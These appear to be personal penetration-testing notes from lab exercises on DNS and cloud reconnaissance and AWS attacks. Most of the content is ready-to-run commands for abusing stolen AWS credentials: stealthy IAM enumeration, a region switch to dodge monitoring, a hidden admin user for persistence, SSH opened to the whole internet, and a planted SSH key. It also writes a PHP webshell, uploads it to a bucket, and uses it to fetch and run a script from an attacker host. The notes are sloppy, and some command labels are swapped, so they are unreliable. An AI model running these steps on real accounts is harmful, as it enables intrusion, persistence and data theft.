
**Choosing Between a Manual or Automated Enumeration Approach**
Most tools generate significant log events and may trigger monitoring systems. This may not be a significant consideration when performing a red team assessment or a penetration test in which stealth is not a requirement, but when stealth is a factor, we must test our tools to determine the potential impact prior to an engagement.

 We should train with multiple tools so that we understand their capabilities and limitations and can rely on them in any given situation, in the best possible combination as needed. It is important, however, that we always understand the technologies in use with any tool we rely on so that we don't develop a bad habit of simply running multiple tools for any given situation which can be dangerous and inefficient.


While doing passive reconnaissance around the domain and public IP address, we should also include more OSINT research to collect more information about the target.

**
** DNS is the control plane for everything, is often shared, and is heavily monitored/rate-limited—so noisy probing stands out faster than with a typical web server.

Get the `Authorative DNS servers` the ones which contian all the records fior the domain
```
host -t ns <TARGET_IP>
```

Result like:
```
offseclab.io name server ns-512.awsdns-00.net.
offseclab.io name server ns-0.awsdns-00.com.
offseclab.io name server ns-1024.awsdns-00.org.
offseclab.io name server ns-1536.awsdns-00.co.uk.
```

run host on each one 
```
host -t ns <NEW_TARGET_IP>
```
Who is each one
```
whois <NEW_bossingit.biz_NAME>
```

 ↻  ---> REPEAT 


## Start simple 
```
dnsenum offseclab.io --threads 100
```


```
dnsrecon -d offseclab.io -t std   
```

EG : DO a Quiter standard and yandex based scan with a dictionary and writeh file to a report
```
dnsrecon -d offseclab.io -D /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t std,yand --threads 30 -x dnsrecon_Report.xml
```

### Brute the DNS
Fist check all is well  
```
dig +short @<LAB_PUBLIC_DNS_IP> www.offseclab.io
```

Then 
```
dnsenum --threads 100 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -o scans/dnsenum-bitquark-offseclab.xml offseclab.io
```


---


# `Cloud_enum` too for quick enum

The cloud-enum tool will search through several public CSPs for resources containing a keyword specified using the **--keyword KEYWORD** (**-k KEYWORD**) parameter. We can specify multiple keyword arguments, or we can specify a list with the **--keyfile KEYFILE** (**-kf KEYFILE**) parameter.

We can also use the **--mutations** (**-m**) option to specify a file to add extra words to the keyword. If we don't specify any file, the **/usr/lib/cloud-enum/enum_tools/fuzz.txt** file is used by default. We can disable this option using the **--quickscan** (**-qs**) parameter.

Let's first test this using the bucket name we already know. We'll run a quickscan with **cloud_enum -k offseclab-assets-public-axevtewi -qs**. We'll also only perform a check in AWS, disabling other CSPs with the **--disable-azure** and **--disable-gcp** parameters.


Once we find the bucket name/ endpoint  like : `offseclab-assets-public-kpuvrgxk/` as per 
- `https://s3.amazonaws.com/offseclab-assets-public-kpuvrgxk/sites/www/images/ruby.jpg`

We can use a toll like this to enum 
```
cloud_enum -k TARGET_bossingit.biz --quickscan --disable-azure --disable-gcp -l Clouod_Enum_Report.txt
```

```
cloud_enum -k offseclab-assets-public-kpuvrgxk --quickscan --disable-azure --disable-gcp -l Clouod_Enum_Report.txt
```

----


## Enum from the APIS ( inside the CSP)

There isn't a golden rule for this, though. The search will depend on the type of resource, the service API, the public CSP, etc. The best way to approach this is to investigate publicly-exposable resources in specific CSPs (e.g. AWS) and consult the documentation for the services we want to try.

Add the key ID env vars to 
```
export AWS_ACCESS_KEY_ID=XXXXXXXXXXXXXXXXXXXXXXXXXX
```

Add the secret Key to you env vars
```
export AWS_SECRET_ACCESS_KEY=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

Sometimes you may even get a session 
```
export AWS_SESSION_TOKEN=<SESSION_BLOB>
```

You can then configure a profile or set these as the default creds

```
aws configure --profile attacker
```

Then add the data blobs when the cli asks for them



See all the images filtered by `description` owned by AWS 
```
aws --profile attacker ec2 describe-images --owners amazon --executable-users all | tee Images_OWnedByAWS_cli_OP.json
```

See all the images filtered by `description`  owened by a victim (*offsecLab*)

```
aws --profile attacker ec2 describe-images --executable-users all --filters "Name=description,Values=*Offseclab*"
```

See all the images filtered by `name`  owened by a victim (*offsecLab*)
```
aws --profile attacker ec2 describe-images --executable-users all --filters "Name=name,Values=*Offseclab*"
```

Search for a public 1GB sized snap shot 
```
ACC=$(aws --profile attacker sts get-caller-identity --query Account --output text) 
```

```
aws --profile attacker --region us-east-1 ec2 describe-snapshots  --owner-ids "$ACC" --filters Name=volume-size,Values=1 --query "Snapshots[].Description" --output text
```


----


### Error message bleeding Accoutn IDS and more
With stolen credentials we can get account ID, the type of identity (IAM user or role), and the name of the identity  fro mthe error message. 
```
aws --profile target lambda invoke --function-name arn:aws:lambda:us-east-1:123456789012:function:nonexistent-function outfile
```

Attackers could also specify a differnt Goe so the logging EDR does nto detect
```
aws --profile target sts get-caller-identity --region us-east-2
```

### List Associated policies
**List inline Policies** ( directly linked to a single identity)
```
aws --profile target iam list-user-policies --user-name clouddesk-plove
```

**List Managed Policies** (distinct, reusable and can be associated with multiple identities)
```
aws --profile target iam list-attached-user-policies --user-name clouddesk-plove
```

### List Policies Related to group membership

Without concern for stealth `Pacu` Modules: `iam__bruteforce_permissions`, `awsenum` or `enumerate-iam` could all be used.

**When Stealth is required** we could adopt a manual approach, which will generate fewer errors and sound less alarms. We should always leverage information from our reconnaissance to help with this.

1. Lits the groups
```
aws --profile target iam list-groups-for-user --user-name clouddesk-plove
```
2. List the inline policies with the discovered group `support`
```
aws --profile target iam list-group-policies --group-name support
```
3. List the Managed Polices of the group `support`
```
aws --profile target iam list-attached-group-policies --group-name support
```
4. Get the current list of versions of a discovered policy

```
aws --profile target iam list-policy-versions --policy-arn "arn:aws:iam::aws:policy/job-function/SupportUser"
```



## IAM Resources Enumeration

Lets get the Users, Groups and Roles

```
aws --profile target iam list-users | tee  users.json
```

```
aws --profile target iam list-groups | tee groups.json
```

```
aws --profile target iam list-roles | tee roles.json
```

### Get all the users

```
aws iam list-users
```

### Create some keys for a user
```
aws iam create-access-key --user admin-mason
```

OP like :
```
{
    "AccessKey": {
        "UserName": "admin-mason", 
        "Status": "Active", 
        "CreateDate": "2026-01-30T10:54:52Z", 
        "SecretAccessKey": "NDXIACoExkCEymJaiDOBK80ue53oGWNoHAS3GYx+", 
        "AccessKeyId": "AKIAQ2HYDUG6INJQABM7"
    }
}
```



## Policies

We can list all managed policies with **list-policies**. We'll use **--scope Local** to display only the _Customer Managed Policies_ and omit the _AWS Managed Policies_, and we'll use **--only-attached** to list only the policies that are attached to an IAM identity.

```
aws --profile target iam list-policies --scope Local --only-attached | tee policies.json
```

#### See what policies
- InLine Policies
```
aws iam list-attached-user-policies --user-name admin-mason --profile admin-mason
```
- Managed Policies
```
aws iam list-user-policies --user-name admin-mason --profile admin-mason
```

And see what groups
```
aws iam list-groups-for-user --user-name admin-mason --profile admin-mason
```

List polices for the attached groups
```
aws iam list-attached-group-policies --group-name admins --profile admin-mason
```


Get info on IAM users, groups, roles, and policies in an AWS account, including their relationships
```
aws --profile target iam get-account-authorization-details
```

## Better  because its just one request
Get space-separated elements which may include **User**, **Role**, **Group**, **LocalManagedPolicy**, and **AWSManagedPolicy**.

```
aws --profile target iam get-account-authorization-details --filter User Group LocalManagedPolicy Role | tee account-authorization-details.json
```



----



# Persistance
Get persistence in the AWS environment by creating a new user and attaching the `AdministratorAccess` policy. We'll use a generic name for this user so that it is less likely to stand out to defenders. We'll generate access keys for this new user so we can return later without depending on existing accounts. Finally, we'll delete the access key previously created for admin-mason.

1. Create user using a known admin profile
```
aws iam create-user --user-name cicd --profile admin-mason
```
2. attach policy
```
aws iam attach-user-policy --user-name cicd --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile admin-mason
```
3. Create access Keys
```
aws iam create-access-key --user-name cicd --profile admin-mason
```

4. Clean up the acces key from the old admin
```
aws iam delete-access-key --user-name admin-mason --access-key-id AKIAQ2HYDUG6DI445EDM --profile admin-mason
```



## Git secrets ( in aws ) Tool
`sudo apt install git-secrets`
I think needs to be used on a git repo - Look up tool - TODO

```
sudo apt install git-secrets
```


```
git secrets --register-aws
```


```
git secrets --scan-history
```


----



### Enumerate S3
Get initial over view of the S3
```
aws s3 ls
```

Go deepr 
```
aws s3 ls qz1idldt-rainydays-dev-tfstate
```
NOTE: Resposne like this has more to review
```
                           PRE state/
```

cp the terraform State files from ther to here
```
aws s3 cp s3://qz1idldt-rainydays-dev-tfstate/state/provisioner.tfstate ./
```

### Create and additional Security Group for remote access
 1. Creating a new security group
```
aws ec2 create-security-group --group-name ec2-access-sg --description "Temporary access"
```

2. # Authorizing SSH access from any IP
```
aws ec2 authorize-security-group-ingress --group-name ec2-access-sg --protocol tcp --port 22 --cidr 0.0.0.0/0
```

3.  Allow the new security group access PostgreSQL
```
aws ec2 authorize-security-group-ingress --group-name rds-postgres-sg --protocol tcp --port 5432 --source-group ec2-access-sg
```


## Launch , prepare and then access and EC2 instance

Create some keys for your machine
```
ssh-keygen -t ed25519
```

1. Obtaining an image ID of an Amazon Linux AMI

```
aws ec2 describe-images --owners amazon --filters "Name=name,Values=al2023-ami-*-x86_64" "Name=root-device-type,Values=ebs" "Name=virtualization-type,Values=hvm" "Name=state,Values=available" --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text
```

we get `ami-0e3008cbd8722baf0` back`

2.  Create userdata script file to inject our public key

```
cat > userdata.sh << 'EOF'
#!/bin/bash
mkdir -p /home/ec2-user/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOiBRPzkSSvMpDIaIVxmmiLufi7fMp1h83jMUf1t80VX" >> /home/ec2-user/.ssh/authorized_keys
chmod 700 /home/ec2-user/.ssh
chmod 600 /home/ec2-user/.ssh/authorized_keys
chown -R ec2-user:ec2-user /home/ec2-user/.ssh
EOF
```


3. Launch EC2 instance using the ami found above and the security group we created
- put the `ami-` value and the `sg-0ebf83098a98ac7dd`
```
aws ec2 run-instances --image-id ami-0e3008cbd8722baf0 --count 1 --instance-type t2.micro --security-group-ids sg-0ebf83098a98ac7dd --user-data file://userdata.sh --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=postgres-dump-instance}]' | /bin/cat
```



--- 

## HackingSnippets  Cloud 

# Cloud 

```
sudo apt install cloud-enum
```

  

Say you have identified via the dev tools images being pulled fro mthe s3 bucket:
- `https://s3.amazonaws.com/offseclab-assets-public-bxwyrmev/sites/www/images/amethyst.png`
 
We could scan with

- `cloud_enum -k offseclab-assets-public-bxwyrmev --quickscan --disable-azure --disable-gcp`

- **--keyword KEYWORD** (**-k KEYWORD**) parameter. We can specify multiple keyword arguments, or we can specify a list with the **--keyfile KEYFILE** (**-kf KEYFILE**) parameter.

- We can also use the **--mutations** (**-m**) option to specify a file to add extra words to the keyword. If we don't specify any file, the **/usr/lib/cloud-enum/enum_tools/fuzz.txt** file is used by default. We can disable this option using the **--quickscan** (**-qs**) parameter.

- We'll also only perform a check in AWS, disabling other CSPs with the **--disable-azure** and **--disable-gcp** parameters.

  
  

With Bash we could do:

  

```

for key in "public" "private" "dev" "prod" "development" "production"; do echo "offseclab-assets-$key-bxwyrmev"; done | tee /tmp/keyfile.txt

```

  

This will produce a new list of potential bucket names which we can then enumerate again.

- `cloud_enum -kf /tmp/keyfile.txt -qs --disable-azure --disable-gcp`

  

----

  

## Awscli (S3)

When configureing ,Using an arbitrary value for all the fields an work.

Sometimes the server is configured to not check authentication (still, it must be configured to something for aws to work).

```

└─# aws configure

AWS Access Key ID [None]: temp

AWS Secret Access Key [None]: temp

Default region name [None]: temp

Default output format [None]: temp

```

Most basic comand to check all is ok with you aws-cli

```

aws sts get-caller-identity

```

  

`# Am I using an assumed role or direct user credentials?`

```

aws sts get-session-token

```

  

```

aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)

```

  
  

List all of the S3 buckets hosted by the server

- `aws --endpoint=http://s3.thetoppers.htb s3 ls`

  

Use the ls command to list objects and common prefixes under the specified bucket.

- `aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`

  

Create a webshell and then copy it to the webserver to get RCE

- `echo '<?php system($_GET["cmd"]); ?>' > shell.php`

- `aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb`

- `http://thetoppers.htb/shell.php?cmd=curl%2010.10.14.105:8000/shell.sh|bash`

  
  

#### Quietly investigate AWS creds with

- **Key info check**: `aws --profile challenge sts get-access-key-info --access-key-id AKIAQOMAIGYUVEHJ7WXM`

- **Non-existent Lambda**: `aws --profile target lambda invoke --function-name arn:aws:lambda:us-east-1:123456789012:function:nonexistent-function outfile`

  

#### AWS policy intel

**Get info on Inline Policies : directly linked to a single identity, only in that identity space.**

`aws --profile target iam list-user-policies --user-name clouddesk-plove`

**Get info on Managed Policies: distinct, reusable and can be associated with multiple identities**

- `aws --profile target iam list-attached-user-policies --user-name clouddesk-plove`

**Get info on group membership**

- `aws --profile target iam list-groups-for-user --user-name clouddesk-plove

**Check the inline group policies with:**

- `aws --profile target iam list-group-policies --group-name support`

**Check the managed group policies with:**

- `aws --profile target iam list-attached-group-policies --group-name support`

**Check the version of the policy**

`aws iam list-policy-versions` for this and specify the policy by its ARN with `--policy-arn`:

- `aws --profile target iam list-policy-versions --policy-arn "arn:aws:iam::aws:policy/job-function/SupportUser"`

Get the policy document with :

- `aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8`

  
  

#### AWScli output processing with JMESPath

  

[_JMESPath_](https://jmespath.org/) is a query language for JSON. It is used to extract and transform elements from a JSON document. We can find more examples on this topic on the [_JMESPath Examples_](https://jmespath.org/examples.html) page and in the [_AWS CLI Filter Output_](https://docs.aws.amazon.com/cli/v1/userguide/cli-usage-filter.html) documentation. We can reduce the number of requests we send by saving all output to a local file and then using an external tool like [_jp_](https://github.com/jmespath/jp) to filter that output with JMESPath expressions.

  

```sh

# List the usernames only

aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[].UserName"

  

# List usernames with admin in

aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[?contains(UserName, 'admin')].{Name: UserName}"

  

# Gather all the names of the IAM _Users_ and _Groups_ which contain "/admin/" in their _Path_ key

aws --profile target iam get-account-authorization-details --filter User Group --query "{Users: UserDetailList[?Path=='/admin/'].UserName, Groups: GroupDetailList[?Path=='/admin/'].{Name: GroupName}}"

```

  

#### Listing out data from a bucket

After configuring the authN `awscli` session we can enumerate the s3 bucket we found at the endpoint where the images were stored:

- `https://staticcontent-79mc0ke9cdg5fodl.s3.us-east-1.amazonaws.com`

  

```

aws s3 ls staticcontent-79mc0ke9cdg5fodl

```

  

#### Aws tools

- [_Awspx_](https://github.com/WithSecureLabs/awspx), a graph-based tool for visualizing effective access and resource relationships within AWS.

- [_Cloudmapper_](https://github.com/duo-labs/cloudmapper) provides visual representations of AWS configurations, helping identify potential issues.

- prowler ??

  

#### Pacu ( aws automated tool)

  

Some Snippets from the tool https://www.kali.org/tools/pacu/

  

```

sudo apt install pacu

pacu # without any arguments, it runs interactive mode.

...

Pacu (enumlab:No Keys Set) >

Pacu (enumlab:No Keys Set) > import_keys target

Imported keys as "imported-target"

Pacu (enumlab:imported-target) > ls # list all availible modules

Pacu (enumlab:imported-target) > help <MODULE_NAME> # Get help on a particular module

Pacu (enumlab:imported-target) > run <MODULE_NAME>

Pacu (enumlab:imported-target) > services # list found items and services

Pacu (enumlab:imported-target) > data <SERVICES_NAME> # returns data on found service. Running empty returns all data.

```
